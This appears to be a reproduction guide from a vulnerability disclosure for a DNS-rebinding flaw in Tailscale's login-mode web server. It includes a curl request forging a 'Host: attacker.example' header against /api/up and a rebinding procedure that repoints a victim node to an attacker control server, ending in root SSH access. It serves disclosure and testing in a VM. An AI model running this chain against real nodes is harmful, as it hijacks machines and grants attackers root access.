# End-to-end reproduction (disposable VM only)

> Run everything in a throwaway Linux VM. Do **not** run the repoint against a
> real/production node — it moves the node to another coordination server.

## A. Prove the server-side defect (fast, local)

Shows `POST /api/up` is accepted in login mode with no session and no Host
validation — the core bug.

1. Logic PoC (no tailscale needed), reproduces the exact gate:
   ```
   cd poc && go run .
   ```
   Expect: rebound/same-origin requests `ACCEPTED`, plain cross-site `REJECTED`.

2. Against a real login-mode server in the VM:
   ```
   sudo tailscaled --tun=userspace-networking &        # not logged in -> NeedsLogin (non-running)
   tailscale web --listen=localhost:8088 &             # LOGIN mode (default)
   # No session cookie, forged Host header -> still accepted (no Host check in login mode):
   curl -i -X POST http://localhost:8088/api/up \
        -H 'Content-Type: application/json' \
        -H 'Host: attacker.example:8088' \
        -H 'Sec-Fetch-Site: same-origin' \
        --data '{"Reauthenticate":false}'
   ```
   A manage-mode server (`:5252`) rejects a forged Host via `requireTailscaleIP`;
   login mode does not. (Use `--data '{"Reauthenticate":false}'` here so you do
   NOT actually repoint — this step only proves the request is authorized.)

## B. Prove the repoint (DNS rebinding)

1. Control a domain `attacker.example` with a 1s-TTL A record; serve
   `poc/rebind.html` from `http://attacker.example:8088/` (same port as the
   victim's login server). Set `ATTACKER_CONTROL` / `ATTACKER_AUTHKEY` in the
   page (see `mock_control_note.md`).
2. Victim VM runs `tailscaled` (not logged in) + `tailscale web` on `:8088`.
3. Victim browser opens `http://attacker.example:8088/`. After load, flip the A
   record to `127.0.0.1`. The page's poll loop re-resolves and `fetch('/api/up')`
   becomes same-origin with the local login server.
4. Observe tailscaled attempt registration against `ATTACKER_CONTROL`
   (`POST /machine/register` over Noise). Node is repointed.

> Modern browsers' Private Network Access / "local network" protections may
> block a public page from fetching a loopback address; note the browser +
> version in your report. The *server-side* missing-defense (step A) is the bug
> regardless of current browser mitigations.

## C. Prove the CRITICAL ceiling (optional, VM)

With the node repointed to an attacker control plane (headscale or
`cmd/testcontrol`) and the victim having had Tailscale SSH enabled (`--ssh`),
serve the root `SSHPolicy` from `mock_control_note.md` and SSH in as root.
